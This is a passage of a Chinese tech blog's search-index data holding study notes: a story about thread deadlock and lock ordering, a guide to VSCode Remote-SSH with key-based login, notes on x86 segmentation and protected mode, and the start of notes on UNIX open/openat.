我欣然接纳：“好啊好啊，关键是你得提前把数据搞到缓存啊，要不然我先问一遍缓存，没有数据，我这不还得找你吗？” 生活就是这样，如果你自己不找点乐子，还有什么意思？ ","date":"2021-07-11","objectID":"/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB-%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:2:0","tags":["码农翻身"],"title":"码农翻身 -- 我是一个线程","uri":"/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB-%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["码农翻身"],"content":"第三回 虎口脱险 前几天我遇到一个可怕的事情，差一点死在外边，回不了线程池了。其实这次遇险我应该能够预想得到才对，真是太大意了。 那天我处理了一些从http发来的存款和取款的包裹，老线程0x6900特意嘱咐我：“处理这些包裹的时候一定要特别小心，你必须先获得一把锁，在对账户存款或取款的时候一定要把账户锁住，要不然别的线程就会在你等待的时候趁虚而入，搞破坏，我年轻那会儿很毛糙，就捅了篓子。” // 高危操作，一定加锁，避免处理过程中被其他线程修改了资源数据 为了“恐吓”我， 好心的0x6900还给了我两个表格： (1) 没有加锁的情况 // 因为没有加锁，两个线程操作了同样的资源数据，导致线程1没有同步线程2操作后的数据结果，出现了错误计算 (2) 加锁的情况 // 在加锁之后，因为线程1加了锁，在完成自己的操作前，线程2没有办法操作共享的数据，只有在线程1操作完成后，线程2才能操作共享数据，确保了数据的一致性。可以把加锁操作看作创建一个原子操作来确保数据的安全。 我看得胆颤心惊，原来不加锁会带来这么严重的事故。从此以后看到存款、取款的包裹就倍加小心，还好没有出过事故。 今天我收到的一个包裹是转账，从某著名演员的账户给某著名导演的账户转钱，具体是谁我就不透漏了，数额可真是不小。 我按照老线程的吩咐，肯定要加锁啊，先对著名演员的账户加锁，再对著名导演的账户加锁。 可我万万没想到的是，还有一个线程，对，就是0x7954, 竟然同时在从这个导演的账户往这个演员的账户转账。 于是乎，就出现了这么个情况： // 死锁 刚开始我还不知道什么情况，一直坐在等待车间傻等，可是等的时间太长了，长达几十秒！我可从来没有经历过这样的事件。 这时候我就看到了线程0x7954 , 他悠闲地坐在那里喝咖啡，我和他聊了起来： “哥们，我看你已经喝了8杯咖啡了，怎么还不去干活？” “你不喝了9杯茶了吗？”0x7954回敬道。 “我在等一个锁，不知道哪个孙子一直不释放！” “我也在等锁啊，我要是知道哪个孙子不释放锁我非揍死他不可！”0x7954毫不示弱。 我偷偷地看了一眼，这家伙怀里不就抱着我正等的某导演的锁吗？ 很明显，0x7954也发现了我正抱着他正在等待的锁。 很快我们两个就吵了起来，互不相让： “把你的锁先给我，让我先做完！” “不行，从来都是做完工作才释放锁，现在绝对不能给你！” 从争吵到打起来，就那么几秒钟的事儿。更重要的是，我们俩不仅仅持有这个著名导演和演员的锁，还有很多其他的锁，导致等待的线程越来越多，围观的人们把屋子都挤满了。最后事情真的闹大了，我从来没见过的终极大boss“操作系统”也来了。大Boss毕竟见多识广，他看了一眼，哼了一声，很不屑地说： “又出现死锁了。” “你们俩要Kill掉一个，来吧，过来抽签。” // 抽签就很形象，人各有命，自然天成 这一下子把我给吓尿了，这么严重啊！我战战兢兢地抽了签，打开一看，是个“活”字。唉，小命终于保住了。 可怜的0x7954被迫交出了所有的资源以后，很不幸地被kill掉，消失了。我拿到了导演的锁，可以开始干活了。大Boss“操作系统”如一阵风似的消失了，身后只传来他的声音： “记住，我们这里导演\u003e演员，无论任何情况都要先获得导演的锁。” // 锁的优先级 由于这里不仅仅只有导演和演员，还有很多其他人，大Boss留下了一个表格， 里边是个算法，用来计算资源的大小，计算出来以后，永远按照从大到小的方式来获得锁： 我回到线程池，大家都知道了我的历险，围着我问个不停。 凶神恶煞的线程调度员把大Boss的算法贴到了墙上。 每天早上，我们都得像无节操的房屋中介、美容美发店的服务员一样，站在门口，像被耍猴一样大声背诵： “多个资源加锁要牢记，一定要按Boss的算法比大小，然后从最大的开始加锁。” ","date":"2021-07-11","objectID":"/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB-%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:3:0","tags":["码农翻身"],"title":"码农翻身 -- 我是一个线程","uri":"/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB-%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["码农翻身"],"content":"第四回 江湖再见 又过了很多天，我和其他线程们发现了一个奇怪的事情：包裹的处理越来越简单，不管任何包裹，不管是登录、浏览、存钱……处理的步骤都是一样的, 返回一个固定的html页面。 // 系统准备重启，线程池即将被销毁 有一次我偷偷地看了一眼，上面写着：“本系统将于今晚 00:00 至4:00 进行维护升级， 给您带来的不便我们深感抱歉！” 我去告诉了老线程0x6904,他叹了一口气说： “唉，我们的生命也到头了，看来马上就要重启系统，我们就要消失了，再见吧兄弟。” 系统重启的那一刻终于到来了。我看到屋子里的东西一个个的不见了，等待车间、就绪车间，甚至CPU车间都慢慢地消失了。我身边的线程兄弟也越来越少，最后只剩我自己了。 我在空旷的原野上大喊：“还有人吗？” 无人应答。 我们这一代线程池完成了使命…… 不过下一代线程池即将重生！ ","date":"2021-07-11","objectID":"/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB-%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:4:0","tags":["码农翻身"],"title":"码农翻身 -- 我是一个线程","uri":"/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB-%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["码农翻身"],"content":"参考 公众号 – 码农翻身（强烈推荐！！！） ","date":"2021-07-11","objectID":"/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB-%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:5:0","tags":["码农翻身"],"title":"码农翻身 -- 我是一个线程","uri":"/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB-%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["码农翻身"],"content":"Me 看雪 [Blog]( ","date":"2021-07-11","objectID":"/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB-%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:6:0","tags":["码农翻身"],"title":"码农翻身 -- 我是一个线程","uri":"/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB-%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"VSCode远程连接Linux","date":"2021-07-06","objectID":"/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/","tags":["VSCode"],"title":"Windows下VSCode远程连接Linux","uri":"/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/"},{"categories":["Misc"],"content":"1. Windows环境配置 确认安装了openssh Windows10下检查是否已经安装OpenSSH的方法： 快捷键Win + X，选择Windows PoweShell（管理员），输入以下指令： Get-WindowsCapability -Online | ? Name -like 'OpenSSH*' ","date":"2021-07-06","objectID":"/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/:1:0","tags":["VSCode"],"title":"Windows下VSCode远程连接Linux","uri":"/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/"},{"categories":["Misc"],"content":"2. VSCode基本配置 安装扩展Remote-SSH 在应用商店中安装扩展“Remote-SSH”： 配置基本config 在扩展设置中开启terminal显示 红框处打上钩选中。 ","date":"2021-07-06","objectID":"/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/:2:0","tags":["VSCode"],"title":"Windows下VSCode远程连接Linux","uri":"/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/"},{"categories":["Misc"],"content":"3. 权限更改 更改C:/Users/v4ler1an/.ssh的文件夹权限： “属性” -\u003e “安全” -\u003e “高级” -\u003e 禁用继承，然后重新添加用户权限。 ","date":"2021-07-06","objectID":"/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/:3:0","tags":["VSCode"],"title":"Windows下VSCode远程连接Linux","uri":"/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/"},{"categories":["Misc"],"content":"4. 无需密码自动登录 server端/etc/ssh/sshd_config配置文件开启了PubkeyAuthentication； Windows本地生成密钥： ssh-keygen -t rsa -c \"email@email.com\" 生成的密钥保存在C:/Users/xxx/.ssh文件夹下 将id_rsa.pub公钥内容复制到server的/home/xxx/.ssh/authorized_keys文件中； 重启server上的sshd服务，重新连接，即可实现无需密码远程连接 ","date":"2021-07-06","objectID":"/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/:4:0","tags":["VSCode"],"title":"Windows下VSCode远程连接Linux","uri":"/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/"},{"categories":["LINUX"],"content":"x86架构部分关键内容整理.","date":"2021-07-04","objectID":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/","tags":["LINUX","x86"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/"},{"categories":["LINUX"],"content":"前言 完整的计算机由操作系统和硬件组成，必须两者兼备，而且两者要完美适配才能良好运作。操作系统的数量屈指可数，但是在操作系统下面的硬件却是千千万万。如何做到操作系统兼容各类各式的硬件环境呢？大家都协议一个通用的架构，大家都适配这个架构好了。于是，一个业内通用的架构——x86架构诞生了。 ","date":"2021-07-04","objectID":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/:1:0","tags":["LINUX","x86"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/"},{"categories":["LINUX"],"content":"一、计算机的工作模式 计算机的硬件根据功能划分成各自独立的产品，在进行组装时需要按照一定的顺序将复杂的设备和连接线安装好。如何安装我知道，但是为什么要这么安装呢？ 下图为一个硬件图和计算机的逻辑图，从这里我们可以大概看到计算机的工作模式： CPU，Central Processing Unit，计算机核心中的核心，所有设备的运作均围绕CPU展开。 总线，Bus，CPU连接其他设备时使用，即主板上数量庞大的集成电路，组成了CPU和其他设备的高速通信通道。 内存，Memory，保存CPU计算的中间结果，使得CPU在后续运算中可以使用临时保存的计算数据。 其他设备，显示器、磁盘、可移动存储介质等。 ","date":"2021-07-04","objectID":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/:2:0","tags":["LINUX","x86"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/"},{"categories":["LINUX"],"content":"1. CPU和内存如何进行配合？ CPU可以划分为3个单元：运算单元、数据单元和控制单元。运算单元专注计算，所使用的数据、计算的结果由数据单元保存（这里需要注意的一点是，虽然CPU可以通过内存总线与内存通信，计算使用的数据和计算结果可以保存在内存中，但是这样速度很慢，每次通过总线传输会很消耗时间，所以CPU内部专门开发了一个数据单元，保存临时、少量的计算数据，这样速度会大幅提升）。数据单元包括CPU内部的缓存和寄存器组，空间小，速度快，仅用于临时存放运算数据。控制单元则负责任务分发和调度，用于获取下一条指令，然后执行，会指导运算单元从数据单元中取出多少数据、怎样进行计算、计算结果放在数据单元的何处等。 程序运行后，每个进程会有自己独立的内存空间，例如图中进程A和进程B，互相隔离。程序的运行一般流程是开辟出一篇内存空间，程序的磁盘上的二进制文件被加载到内存空间中，形成代码段、数据段等。进程A和进程B在成功加载后，彼此的运行空间互相隔离，但是并不连续，这里的不连续是指分配的内存空间在物理上不一定是连续的，这主要与Linux操作系统的内存分配机制有关，后续会做详细深入分析。而且除了上图中的代码段和数据段，还会有其他的段。 程序运行中需要操作的数据和产生的运算结果，会存放在数据段中。CPU如何执行程序，操作这些数据，产生运算结果，并写回内存呢？ CPU的控制单元中有一个指令指针寄存器，保存了下一条指令在内存中的地址。控制单元会从代码段中不断获取指令的地址放入该进村其中，在执行时直接读取该寄存器，就可以知道下一条要执行的指令了。 指令一般分两部分，第一部分是做什么操作，第二部分是该操作要操作的数据。要执行这条指令，需要将第一部分交给运算单元，第二部分交给数据单元，数据单元根据数据的地址，从数据段里读到数据寄存器中，然后再参与运算。运算单元做完运算，产生的结果暂存在数据单元的数据寄存器中，等待指令将其写回到内存中的数据段中。 ","date":"2021-07-04","objectID":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/:2:1","tags":["LINUX","x86"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/"},{"categories":["LINUX"],"content":"2. 进程切换 上面所讲的各种操作均在进程A中进行，那么进程B呢？CPU里有两个专门的寄存器保存当前处理进程的代码段、数据段的起始地址。如果寄存器里保存的是进程A的地址，那么就执行进程A的指令；如果切换为进程B的地址，那么就执行进程B的指令，这个过程称为进程切换(Process Switch)。 进程切换是多任务系统的必备操作，后续会进行深入分析。 ","date":"2021-07-04","objectID":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/:2:2","tags":["LINUX","x86"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/"},{"categories":["LINUX"],"content":"3. 地址总线和数据总线 CPU和内存的数据传输主要靠总线，总线在整体上分为两类： 地址总线(Address Bus)，访问地址数据，即读取内存中何处的数据 数据总线(Data Bus)，读取到的数据 地址总线的位数，决定了能访问的地址范围。如何理解？例如总线只有2位，那么能访问的地址就为00、01、10、11这4个地址，如果是3位就可以访问8个地址，所以地址总线位数越多，能访问的地址范围就越广。 数据总线的位数，决定了一次可以读多少数据。如何理解？例如总线只有2位，那么CPU一次只能拿2位，想要拿8位，就需要读4次。所以数据总线位数越多，一次可以读取的数据就越多，访问速度也就越快。 ","date":"2021-07-04","objectID":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/:2:3","tags":["LINUX","x86"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/"},{"categories":["LINUX"],"content":"4. x86架构 x86泛指一系列基于Intel 8086且向后兼容的中央处理器指令集架构。最早的8086处理器于1978年由Intel推出，为16位微处理器。但是让x86真正得到推广的，是IBM。因为IBM的PC卖得太好，被起诉垄断，无奈之下公开了一些技术，这使得业内其他品牌逐步都开始采用IBM的“Intel 8088芯片+MS-DOS”的PC模式。Intel的技术因此成为了行业的开放事实标准。由于该系列开端与8086，因此称为x86架构。 虽然后来的Intel的CPU的数据总线和地址总线越来越宽，处理能力越来越强，但是始终坚持标准、开放、兼容的原则，因此构建了一个庞大的软硬件生态。 部分芯片和总线数据如下： 型号 总线位宽 地址位 寻址空间 8080 8 16 64k (2^16) 8086 16 20 1M (2^20) 8088 8 20 1M (2^20) 80386 32 32 4G (2^32) ","date":"2021-07-04","objectID":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/:2:4","tags":["LINUX","x86"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/"},{"categories":["LINUX"],"content":"三、8086的原理 x86中最经典的一款处理器就是8086处理器，至今为止很多操作系统仍然保持对该处理器的兼容性。 下图为CPU内部组件构成图： 数据单元，包含8个16位的寄存器：AX、BX、CX、DX、SP、BP、SI、DI。其中，AX、BX、CX、DX可以拆分成2个8位的寄存器使用：AH、AL、BH、BL、CH、CL、DH、DL。H代表High，表示高位，L代表Low，表示地位。这样以来，长数据可以直接使用完整的寄存器，而短数据也可以妥善处理。 控制单元，IP（Instruction Pointer Register）寄存器即指令指针寄存器，用于确定下一条指令的地址。CPU根据该寄存器不断将指令从内存的代码段中加载到指令队列里，然后交给运算单元执行。4个段寄存器，CS、DS、SS、ES寄存器，则用于进程切换中。CS指代码段寄存器（Code Segment Register），通过它可以找到代码在内存中的地址；DS是数据段寄存器，通过它可以找到数据在内存中的地址。SS是栈寄存器（Stack Segment Register），一般存放堆栈段的首地址，配合SP或BP使用，ES是附加段寄存器（Extra Segment）。当前面的段寄存器不够用时，可以使用ES寄存器。 进行运算时如何加载内存中的数据呢？ 通过DS确定数据段地址 通过寄存器确定偏移量（Offset），确定待用数据在段中的偏移（代码段的偏移量会存放在IP寄存器，数据段的偏移量存放在通用寄存器中） 通过\"起始地址 * 16 + 偏移量\"确定最终地址 这里需要注意，CS和DS均为16位，IP也是16位，即起始地址和偏移量都是16位，但是8086的地址总线时20位，所以需要通过上面的公式计算出最终的数据地址。 根据地址总线长度，8086的最大寻址能力为1M。且因为偏移量为16位，所以一个段的最大的大小为2^16=64K。 ","date":"2021-07-04","objectID":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/:3:0","tags":["LINUX","x86"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/"},{"categories":["LINUX"],"content":"四、32位处理器 核心就是扩展总线位宽，扩大内存。地址总线变为32根，寻址能力达到2^32=4G。如何使得硬件保持兼容呢？ 首先，扩展通用寄存器，将8个16位寄存器扩展为32位，但是依然可以保留16位和8位的使用方式（8位的使用只能在低位，如果高位也切割，就会不兼容）。IP寄存器扩展成32位，同时兼容16位。本质上，思想跟8086的思想是一样的，只是硬件做了升级。 回顾一下8086的寻址方式，20位地址的使用其实是有点尴尬的，结果还导致必须使用“起始地址 * 16 + 偏移量”的方式来计算实际地址。如果寄存器全部变成32位，4G的内存空间都可以访问到，是不是可以省去计算公式呢？ 在32位寄存器的系统中，CS、DS、SS、ES仍然为16位，但不再是段的起始地址。段的起始地址放在内存的某个地方，这个地方是一个表格，表格中的每一项都是一个段描述符（Segment Descriptor），段描述符中放的才是真正的段的起始地址。而段寄存器则存放具体是表格中的哪一项，称为选择子（Selector）。这样，就将从一个段寄存器直接获取段的起始地址，变成先间接地从段寄存器后的表格中的一项，然后从表格的一项中后去真正的段起始地址。实际上为了快速拿到段起始地址，段寄存器会从内存中拿到CPU的描述符高速缓存器中。（这个保存各个段的起始地址的表格其实是GDT（Global Descriptor Table，全局描述符表）和LDT（Local Descriptor Table，局部描述符表）） 32位这种设计方案的思想很值得大家好好琢磨，单纯地寻址总是要比计算+寻址地速度快的。个人认为，这种方案可以说纠正了20位地址总线的一种技术落后导致的设计错误，而且这种方案远远比20位的更灵活。 但是这样会导致不兼容问题的出现，怎么办？大的小的我都要。 32位架构下，出现了实模式（Real Pattern）和保护模式（Protect Pattern）。实模式就是前面的运行模式，保护模式就是后面的运行模式。在系统刚启动时，运行在实模式，运行成功后变为保护模式。这其实是一种通过切换模式实现兼容的方案。可见技术的发展，也影响着人的思想的发展。 ","date":"2021-07-04","objectID":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/:4:0","tags":["LINUX","x86"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/"},{"categories":["LINUX"],"content":"五、参考 专栏 – 《趣谈Linux操作系统》 ","date":"2021-07-04","objectID":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/:5:0","tags":["LINUX","x86"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%A7%E5%8D%83%E4%B8%96%E7%95%8Cx86/"},{"categories":["UNIX"],"content":"UNIX高级编程文件I/O部分关键内容整理.","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"一、引言 UNIX中可用的文件I/O函数：打开文件、读文件、写文件等，大部分文件I/O只需用到5个函数：open, read, write, lseek, close。本章描述的函数常被称为“不带缓冲的I/O”，这是指 read 和 write 都调用内核的一个系统调用。 本章还包括进程间资源共享时的原子操作，并讨论如何在多个进程间共享文件以及所涉及的内核有关数据结构。 此外，还包括 dup, fcntl, sync, fsync, ioctl 函数的相关说明。 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:1:0","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"二、文件描述符（File Descriptor） 对于内核而言，所有打开的文件都通过文件描述符进行引用，它是一个非负整数。打开现有文件或创建新文件时，内核会向进程返回一个文件描述符，读写一个文件时会使用 open 或 create 返回的文件描述符标识该文件，并将其作为参数传递给 read 或 write 。 惯例：UNIX系统中，shell文件会将fd与进程进行如下对应： fd 含义 对应常量（定义在 \u003cunistd.h\u003e 文件） 0 标准输入 STDIN_FILENO 1 标准输出 STDOUT_FILENO 2 标准错误 STDERR_FILENO ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:2:0","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"三、函数 open 和 openat ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:3:0","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"1. 作用 打开或创建一个文件。 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:3:1","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"2. 定义 #include \u003cfcntl.h\u003e int open(const char *path, int oflag, ... /*mode_t mode*/); int openat(int fd, const char *path, int oflag, ... /*mode_t mode*/); /* Return : 成功，返回文件描述符 错误，返回-1 */ ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:3:2","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"3. 参数 1. path 参数 要打开或创建文件的名字 2. oflag 参数 关键可选项如下（可单独使用或进行“或”运算使用）： O_RDONLY 只读打开 - 0 O_WRONLY 只写打开 - 1 O_RDWR 读、写打开 - 2 O_EXEC 只执行打开 O_SEARCH 只搜索打开（应用于目录），主要用于在目录打开时验证其搜索权限。 O_APPEND 每次写时都追加到文件尾端。 O_CREAT 文件不存在则进行创建。使用该选项时，open 函数需同时说明第三个参数 mode 以指定该新文件的访问权限位。 O_EXCL 如果同时指定了 O_CREAT 但文件已存在，则报错。可以测试文件是否存在，如不存在，则创建文件，合并测试和创建文件变成一个原子操作（后续介绍）。 O_SYNC 使每次 write 等待物理I/O操作完成，包括由该 write 引起的文件属性更新所需的I/O。 O_TRUNC 如果文件存在，且为只读或读-写成功打开，则将其长度截断为0。 O_DSYNC 使每次 write 等待物理I/O操作完成，但如果该写操作不影响读取刚写入的数据，则不需等待文件属性的更新。 O_RSYNC 使每个以fd为参数进行的read操作等待，直到所有对文件同一部分挂起的写操作完成。 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:3:3","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"4. misc 由 open 和 openat 函数返回的fd一定是最小的未使用的描述符数值。一种常见的应用场景是：在标准输入、输出或错误上打开新文件。例如，应用程序先关闭标准输出（fd 1），然后打开另一个文件，在执行打开操作前就可以知道该文件一定会在fd 1上打开。 fd 参数将 open 和 openat 进行区分，有以下三种可能： path 参数指定的为绝对路径名时，fd 参数被忽略，open 和 openat 函数相同 path 参数指定的为相对路径，fd is a file descriptor that specifies the starting location in the file system where the relative pathname is to be evaluated（此处使用英文原版描述更为准确，中文版翻译存在误差。）fd 通过打开相对路径名所在的目录获取。 path 指定了相对路径， fd 参数具有特殊值 AT_FDCWD，此时路径名在当前工作目录中获取，两个函数操作类似。 openat 函数的出现主要是为了解决2个问题： 让线程可以使用相对路径名打开目录中的文件，而不再只能打开当前工作目录。 避免 **time-of-check-to-time-of-use(TOCTTOU)**错误（该错误的基本思想：如果有两个基于文件的函数调用，其中第二个调用依赖于第一个调用的结果，那么程序就是脆弱的，简言之，非原子操作。） 文件名和路径名截断 当文件名或路径名超过预定义的最大长度时，系统会对名字进行截断，保持长度到最大预定义的值。 如果最大值为14，而文件名恰好是14个字符，此时诸如 open、stat等无法确定该文件的原始名，因为函数无法判断该文件名是否发生过截断。 目前大多数的现代文件系统支持的最大文件名长度为255。 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:3:4","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"四、函数 creat 